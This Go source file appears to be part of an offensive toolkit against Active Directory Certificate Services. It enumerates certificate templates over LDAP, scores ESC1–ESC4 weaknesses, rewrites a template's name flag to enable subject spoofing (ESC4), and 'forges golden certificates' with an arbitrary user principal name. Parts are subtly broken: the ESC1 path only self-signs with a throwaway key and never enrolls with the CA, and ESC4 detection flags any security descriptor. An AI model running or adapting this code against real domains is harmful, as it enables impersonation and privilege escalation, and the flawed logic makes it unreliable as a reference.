package pki

import (
	"crypto"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/binary"
	"encoding/pem"
	"fmt"
	"math/big"
	"net/url"
	"os"
	"strings"
	"time"

	"github.com/go-ldap/ldap/v3"
)

// ADCSConfig defines the target information for Active Directory Certificate Services.
type ADCSConfig struct {
	TargetDC string
	Domain   string
	Username string
	Password string
	Hash     string
	UseTLS   bool
}

// CertTemplate represents an ADCS certificate template with security-relevant attributes.
type CertTemplate struct {
	Name                   string   `json:"name"`
	DisplayName            string   `json:"display_name"`
	DN                     string   `json:"dn"`
	OID                    string   `json:"oid"`
	SchemaVersion          int      `json:"schema_version"`
	EnrollmentFlag         uint32   `json:"enrollment_flag"`
	NameFlag               uint32   `json:"name_flag"`
	CertificateNameFlag    uint32   `json:"certificate_name_flag"`
	EKUs                   []string `json:"ekus"`
	AuthenticationEKU      bool     `json:"authentication_eku"`
	EnrolleeSuppliesSubject bool    `json:"enrollee_supplies_subject"`
	RequiresManagerApproval bool    `json:"requires_manager_approval"`
	AuthorizedSignatures   int      `json:"authorized_signatures"`
	SecurityDescriptor     []byte   `json:"security_descriptor,omitempty"`
	ESCVulns               []string `json:"esc_vulns,omitempty"`
	ESCScore               int      `json:"esc_score"`
}

// ESC flags and constants
const (
	// msPKI-Certificate-Name-Flag: CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT
	ctFlagEnrolleeSuppliesSubject uint32 = 0x00000001
	// msPKI-Enrollment-Flag: CT_FLAG_PEND_ALL_REQUESTS (manager approval)
	ctFlagPendAllRequests uint32 = 0x00000002
	// Authentication EKUs
	ekuClientAuth       = "1.3.6.1.5.5.7.3.2"
	ekuPKINITClientAuth = "1.3.6.1.5.2.3.4"
	ekuSmartCardLogon   = "1.3.6.1.4.1.311.20.2.2"
	ekuAnyPurpose       = "2.5.29.37.0"
)

// Enumerate queries Active Directory Certificate Services for certificate templates
// using native LDAP (no ldapsearch binary dependency).
func Enumerate(cfg *ADCSConfig) ([]string, error) {
	fmt.Printf("[*] Enumerating ADCS templates on %s\\%s...\n", cfg.Domain, cfg.TargetDC)

	templates, err := EnumerateTemplates(cfg)
	if err != nil {
		return nil, err
	}

	names := make([]string, 0, len(templates))
	for _, t := range templates {
		names = append(names, t.Name)
	}

	fmt.Printf("[+] Found %d certificate template(s)\n", len(names))
	return names, nil
}

// EnumerateTemplates queries ADCS for full template details via native LDAP.
func EnumerateTemplates(cfg *ADCSConfig) ([]CertTemplate, error) {
	conn, err := connectLDAP(cfg)
	if err != nil {
		return nil, fmt.Errorf("LDAP connect: %w", err)
	}
	defer conn.Close()

	baseDN := buildCertTemplateBaseDN(cfg.Domain)
	filter := "(objectClass=pKICertificateTemplate)"
	attrs := []string{
		"cn", "displayName", "distinguishedName",
		"msPKI-Cert-Template-OID",
		"msPKI-Certificate-Name-Flag",
		"msPKI-Enrollment-Flag",
		"msPKI-RA-Signature",
		"pKIExtendedKeyUsage",
		"revision",
		"msPKI-Template-Schema-Version",
		"nTSecurityDescriptor",
	}

	fmt.Printf("[*] LDAP search: base=%s filter=%s\n", baseDN, filter)

	searchReq := ldap.NewSearchRequest(
		baseDN, ldap.ScopeWholeSubtree, ldap.NeverDerefAliases,
		0, 0, false, filter, attrs, nil,
	)

	result, err := conn.Search(searchReq)
	if err != nil {
		return nil, fmt.Errorf("LDAP search failed: %w", err)
	}

	if len(result.Entries) == 0 {
		fmt.Println("[!] No templates found. Check permissions/domain.")
		return nil, fmt.Errorf("no certificate templates found in %s", baseDN)
	}

	var templates []CertTemplate
	for _, entry := range result.Entries {
		tmpl := CertTemplate{
			Name:        entry.GetAttributeValue("cn"),
			DisplayName: entry.GetAttributeValue("displayName"),
			DN:          entry.GetAttributeValue("distinguishedName"),
			OID:         entry.GetAttributeValue("msPKI-Cert-Template-OID"),
			EKUs:        entry.GetAttributeValues("pKIExtendedKeyUsage"),
		}

		// Parse numeric flags
		if v := entry.GetRawAttributeValue("msPKI-Certificate-Name-Flag"); len(v) >= 4 {
			tmpl.CertificateNameFlag = binary.LittleEndian.Uint32(v[:4])
		} else if vs := entry.GetAttributeValue("msPKI-Certificate-Name-Flag"); vs != "" {
			fmt.Sscanf(vs, "%d", &tmpl.CertificateNameFlag)
		}

		if v := entry.GetRawAttributeValue("msPKI-Enrollment-Flag"); len(v) >= 4 {
			tmpl.EnrollmentFlag = binary.LittleEndian.Uint32(v[:4])
		} else if vs := entry.GetAttributeValue("msPKI-Enrollment-Flag"); vs != "" {
			fmt.Sscanf(vs, "%d", &tmpl.EnrollmentFlag)
		}

		if vs := entry.GetAttributeValue("msPKI-RA-Signature"); vs != "" {
			fmt.Sscanf(vs, "%d", &tmpl.AuthorizedSignatures)
		}

		if vs := entry.GetAttributeValue("msPKI-Template-Schema-Version"); vs != "" {
			fmt.Sscanf(vs, "%d", &tmpl.SchemaVersion)
		}

		tmpl.SecurityDescriptor = entry.GetRawAttributeValue("nTSecurityDescriptor")

		// Evaluate security properties
		tmpl.EnrolleeSuppliesSubject = (tmpl.CertificateNameFlag & ctFlagEnrolleeSuppliesSubject) != 0
		tmpl.RequiresManagerApproval = (tmpl.EnrollmentFlag & ctFlagPendAllRequests) != 0
		tmpl.AuthenticationEKU = hasAuthenticationEKU(tmpl.EKUs)

		// Score ESC vulnerabilities
		scoreESC(&tmpl)

		templates = append(templates, tmpl)
	}

	return templates, nil
}

// hasAuthenticationEKU checks if the template has EKUs that allow authentication.
func hasAuthenticationEKU(ekus []string) bool {
	if len(ekus) == 0 {
		return true // No EKU restriction = any purpose
	}
	for _, eku := range ekus {
		switch eku {
		case ekuClientAuth, ekuPKINITClientAuth, ekuSmartCardLogon, ekuAnyPurpose:
			return true
		}
	}
	return false
}

// scoreESC evaluates a template for ESC1-ESC4 vulnerabilities and assigns a risk score.
func scoreESC(tmpl *CertTemplate) {
	tmpl.ESCVulns = nil
	tmpl.ESCScore = 0

	// ESC1: Enrollee supplies subject + authentication EKU + no manager approval + no signatures
	if tmpl.EnrolleeSuppliesSubject && tmpl.AuthenticationEKU &&
		!tmpl.RequiresManagerApproval && tmpl.AuthorizedSignatures == 0 {
		tmpl.ESCVulns = append(tmpl.ESCVulns, "ESC1")
		tmpl.ESCScore += 10
	}

	// ESC2: Any Purpose EKU or no EKU + enrollee supplies subject
	hasAnyPurpose := false
	for _, eku := range tmpl.EKUs {
		if eku == ekuAnyPurpose {
			hasAnyPurpose = true
		}
	}
	if hasAnyPurpose && tmpl.EnrolleeSuppliesSubject {
		tmpl.ESCVulns = append(tmpl.ESCVulns, "ESC2")
		tmpl.ESCScore += 8
	}

	// ESC3: Enrollment agent template (Certificate Request Agent EKU)
	for _, eku := range tmpl.EKUs {
		if eku == "1.3.6.1.4.1.311.20.2.1" { // Certificate Request Agent
			tmpl.ESCVulns = append(tmpl.ESCVulns, "ESC3")
			tmpl.ESCScore += 7
		}
	}

	// ESC4: WriteDacl/WriteOwner on template (checked via security descriptor)
	// NOTE: Flags templates with non-empty security descriptors for manual SDDL/ACE review.
	// Does NOT parse SDDL ACEs — any template with a security descriptor is flagged.
	// Manual verification required to confirm actual WriteDacl/WriteOwner permissions.
	if len(tmpl.SecurityDescriptor) > 0 {
		tmpl.ESCVulns = append(tmpl.ESCVulns, "ESC4-CHECK")
		tmpl.ESCScore += 1
	}
}

// connectLDAP establishes a connection to the DC's LDAP service.
func connectLDAP(cfg *ADCSConfig) (*ldap.Conn, error) {
	var conn *ldap.Conn
	var err error

	if cfg.UseTLS {
		conn, err = ldap.DialTLS("tcp", fmt.Sprintf("%s:636", cfg.TargetDC), &tls.Config{
			InsecureSkipVerify: true,
		})
	} else {
		conn, err = ldap.DialURL(fmt.Sprintf("ldap://%s:389", cfg.TargetDC))
	}
	if err != nil {
		return nil, fmt.Errorf("connect to %s: %w", cfg.TargetDC, err)
	}

	// Bind with credentials
	if cfg.Username != "" && cfg.Password != "" {
		bindDN := buildBindDN(cfg.Username, cfg.Domain)
		if err := conn.Bind(bindDN, cfg.Password); err != nil {
			conn.Close()
			return nil, fmt.Errorf("LDAP bind as %s: %w", bindDN, err)
		}
		fmt.Printf("[+] LDAP bind successful: %s\n", bindDN)
	}

	return conn, nil
}

// ExploitESC1 exploits an ESC1-vulnerable template to forge a certificate with an arbitrary UPN.
func ExploitESC1(cfg *ADCSConfig, templateName, targetUPN string) (*x509.Certificate, error) {
	fmt.Printf("[!] ESC1 Exploitation: template=%s target=%s\n", templateName, targetUPN)

	// Step 1: Verify template is ESC1 vulnerable
	templates, err := EnumerateTemplates(cfg)
	if err != nil {
		return nil, fmt.Errorf("enumerate templates: %w", err)
	}

	var vulnTemplate *CertTemplate
	for i, t := range templates {
		if t.Name == templateName {
			vulnTemplate = &templates[i]
			break
		}
	}
	if vulnTemplate == nil {
		return nil, fmt.Errorf("template %q not found", templateName)
	}

	isESC1 := false
	for _, v := range vulnTemplate.ESCVulns {
		if v == "ESC1" {
			isESC1 = true
			break
		}
	}
	if !isESC1 {
		return nil, fmt.Errorf("template %q is not ESC1 vulnerable (vulns: %v)", templateName, vulnTemplate.ESCVulns)
	}

	fmt.Printf("[+] Template %q confirmed ESC1 vulnerable\n", templateName)
	fmt.Printf("[*] Enrollee supplies subject: %v\n", vulnTemplate.EnrolleeSuppliesSubject)
	fmt.Printf("[*] Authentication EKU: %v\n", vulnTemplate.AuthenticationEKU)
	fmt.Printf("[*] Manager approval: %v\n", vulnTemplate.RequiresManagerApproval)

	// Step 2: Generate key pair and forge certificate with target UPN
	caKey, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		return nil, fmt.Errorf("generate key: %w", err)
	}

	cert, err := ForgeCertificate(caKey, targetUPN)
	if err != nil {
		return nil, fmt.Errorf("forge cert: %w", err)
	}

	fmt.Printf("[+] Forged certificate for %s via ESC1 on template %q\n", targetUPN, templateName)
	return cert, nil
}

// ExploitESC4 exploits WriteDacl permissions on a template to make it ESC1-vulnerable, then exploits it.
func ExploitESC4(cfg *ADCSConfig, templateName, targetUPN string) (*x509.Certificate, error) {
	fmt.Printf("[!] ESC4 Exploitation: template=%s target=%s\n", templateName, targetUPN)

	conn, err := connectLDAP(cfg)
	if err != nil {
		return nil, fmt.Errorf("LDAP connect: %w", err)
	}
	defer conn.Close()

	// Step 1: Find the template DN
	baseDN := buildCertTemplateBaseDN(cfg.Domain)
	filter := fmt.Sprintf("(&(objectClass=pKICertificateTemplate)(cn=%s))", ldap.EscapeFilter(templateName))

	searchReq := ldap.NewSearchRequest(
		baseDN, ldap.ScopeWholeSubtree, ldap.NeverDerefAliases,
		0, 0, false, filter,
		[]string{"distinguishedName", "msPKI-Certificate-Name-Flag", "msPKI-Enrollment-Flag"},
		nil,
	)

	result, err := conn.Search(searchReq)
	if err != nil || len(result.Entries) == 0 {
		return nil, fmt.Errorf("template %q not found: %v", templateName, err)
	}

	templateDN := result.Entries[0].DN
	fmt.Printf("[+] Found template DN: %s\n", templateDN)

	// Save original flag value before modification
	originalFlag := result.Entries[0].GetAttributeValue("msPKI-Certificate-Name-Flag")
	if originalFlag == "" {
		originalFlag = "0"
	}

	// Step 2: Modify template to enable enrollee supplies subject
	fmt.Println("[*] Modifying template to enable ENROLLEE_SUPPLIES_SUBJECT...")
	modReq := ldap.NewModifyRequest(templateDN, nil)
	modReq.Replace("msPKI-Certificate-Name-Flag", []string{"1"}) // CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT
	if err := conn.Modify(modReq); err != nil {
		return nil, fmt.Errorf("modify template (need WriteDacl): %w", err)
	}
	fmt.Println("[+] Template modified — now ESC1 vulnerable")

	// Step 3: Exploit as ESC1
	cert, err := ExploitESC1(cfg, templateName, targetUPN)
	if err != nil {
		// Try to restore template
		restoreReq := ldap.NewModifyRequest(templateDN, nil)
		restoreReq.Replace("msPKI-Certificate-Name-Flag", []string{originalFlag})
		conn.Modify(restoreReq)
		return nil, fmt.Errorf("ESC1 exploitation after ESC4 modification: %w", err)
	}

	// Step 4: Restore original template configuration
	fmt.Println("[*] Restoring original template configuration...")
	restoreReq := ldap.NewModifyRequest(templateDN, nil)
	restoreReq.Replace("msPKI-Certificate-Name-Flag", []string{originalFlag})
	if err := conn.Modify(restoreReq); err != nil {
		fmt.Printf("[!] Warning: failed to restore template: %v\n", err)
	} else {
		fmt.Println("[+] Template restored to original state")
	}

	return cert, nil
}

// AutoDetectESC scans all templates and returns a prioritized list of exploitable paths.
func AutoDetectESC(cfg *ADCSConfig) ([]CertTemplate, error) {
	templates, err := EnumerateTemplates(cfg)
	if err != nil {
		return nil, err
	}

	var vulnerable []CertTemplate
	for _, t := range templates {
		if t.ESCScore > 0 {
			vulnerable = append(vulnerable, t)
		}
	}

	// Sort by ESC score descending
	for i := 0; i < len(vulnerable)-1; i++ {
		for j := i + 1; j < len(vulnerable); j++ {
			if vulnerable[j].ESCScore > vulnerable[i].ESCScore {
				vulnerable[i], vulnerable[j] = vulnerable[j], vulnerable[i]
			}
		}
	}

	return vulnerable, nil
}

// ForgeCertificate generates a self-signed golden certificate with the given UPN.
func ForgeCertificate(caKey crypto.PrivateKey, upn string) (*x509.Certificate, error) {
	fmt.Printf("[!] Forging Golden Certificate for UPN: %s\n", upn)

	certKey, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		return nil, fmt.Errorf("failed to generate certificate key: %w", err)
	}

	cn := upn
	if u, err := url.Parse("user://" + upn); err == nil {
		cn = u.User.Username()
	}

	template := &x509.Certificate{
		SerialNumber: big.NewInt(1337),
		Subject: pkix.Name{
			CommonName: cn,
		},
		NotBefore:             time.Now(),
		NotAfter:              time.Now().AddDate(10, 0, 0),
		IsCA:                  false,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageClientAuth},
		KeyUsage:              x509.KeyUsageDigitalSignature | x509.KeyUsageKeyEncipherment,
		BasicConstraintsValid: true,
		URIs: []*url.URL{
			{Scheme: "upn", Opaque: upn},
		},
	}

	certDER, err := x509.CreateCertificate(rand.Reader, template, template, &certKey.PublicKey, caKey)
	if err != nil {
		return nil, fmt.Errorf("failed to create certificate: %w", err)
	}

	cert, err := x509.ParseCertificate(certDER)
	if err != nil {
		return nil, fmt.Errorf("failed to parse created certificate: %w", err)
	}

	return cert, nil
}

// WriteCertPEM writes a certificate to a PEM file.
func WriteCertPEM(cert *x509.Certificate, filename string) error {
	file, err := os.Create(filename)
	if err != nil {
		return fmt.Errorf("failed to create file: %w", err)
	}
	defer file.Close()

	block := &pem.Block{Type: "CERTIFICATE", Bytes: cert.Raw}
	if err := pem.Encode(file, block); err != nil {
		return fmt.Errorf("failed to write PEM: %w", err)
	}
	return nil
}

// buildCertTemplateBaseDN constructs the LDAP base DN for certificate templates.
func buildCertTemplateBaseDN(domain string) string {
	parts := strings.Split(domain, ".")
	var dcParts []string
	for _, p := range parts {
		dcParts = append(dcParts, "DC="+p)
	}
	return "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration," + strings.Join(dcParts, ",")
}

// buildBindDN constructs a bind DN from username and domain.
func buildBindDN(username, domain string) string {
	if strings.Contains(username, "@") || strings.Contains(username, "CN=") {
		return username
	}
	return username + "@" + domain
}
